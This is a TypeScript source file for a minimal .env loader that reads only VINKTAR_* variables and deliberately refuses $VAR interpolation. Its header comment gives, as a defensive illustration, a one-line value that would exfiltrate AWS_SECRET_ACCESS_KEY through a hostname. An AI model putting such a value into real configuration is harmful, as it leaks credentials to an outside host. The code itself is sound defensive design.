import { readFile } from 'node:fs/promises';

/**
 * Reading `VINKTAR_*` out of a `.env` file.
 *
 * Deliberately small. This is not a dotenv replacement: it exists so a developer running the CLI
 * by hand gets the same values their Vite build already reads, and it stops there.
 *
 * **No `$VAR` interpolation.** A `.env` that can reference the process environment is a `.env`
 * that can exfiltrate it — `VINKTAR_HOST=https://$AWS_SECRET_ACCESS_KEY.example.com` is a
 * one-line data leak in a file people paste from a README. Values are literal.
 */

export interface DotEnv {
  readonly values: Record<string, string>;
  readonly warnings: string[];
  /** Whether the file existed at all. A missing file is not an error, and not silent either. */
  readonly found: boolean;
}

/**
 * @param path the file to read. The flag that supplies it is `--dotenv-file`, never `--env-file`:
 *   Node has owned `--env-file` since 20.6 and swallows it before the CLI's own parser ever sees
 *   the argument, so a user passing it would silently configure Node instead.
 */
export async function loadDotEnv(path: string): Promise<DotEnv> {
  let raw: string;
  try {
    raw = await readFile(path, 'utf8');
  } catch {
    return { values: {}, warnings: [], found: false };
  }

  const values: Record<string, string> = {};
  const warnings: string[] = [];

  raw.split(/\r?\n/).forEach((line, index) => {
    const trimmed = line.trim();
    if (trimmed === '' || trimmed.startsWith('#')) return;

    const match = /^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)$/.exec(trimmed);
    if (match === null) {
      // Named with the line number, because "malformed .env" and nothing else is a file people
      // then read from the top, three times.
      warnings.push(`${path}:${index + 1} is not NAME=value and was ignored.`);

      return;
    }

    const name = match[1]!;
    if (!name.startsWith('VINKTAR_')) return;

    values[name] = unquote(match[2] ?? '');
  });

  return { values, warnings, found: true };
}

/**
 * Strip one layer of matching quotes, and the trailing comment on an unquoted value.
 *
 * `KEY=abc # staging` means the key is `abc`, which is the behaviour every dotenv implementation
 * has and the one people write against. Inside quotes a `#` is part of the value.
 */
function unquote(value: string): string {
  const trimmed = value.trim();

  if (
    (trimmed.startsWith('"') && trimmed.endsWith('"') && trimmed.length > 1) ||
    (trimmed.startsWith("'") && trimmed.endsWith("'") && trimmed.length > 1)
  ) {
    return trimmed.slice(1, -1);
  }

  const comment = trimmed.indexOf(' #');

  return (comment === -1 ? trimmed : trimmed.slice(0, comment)).trim();
}
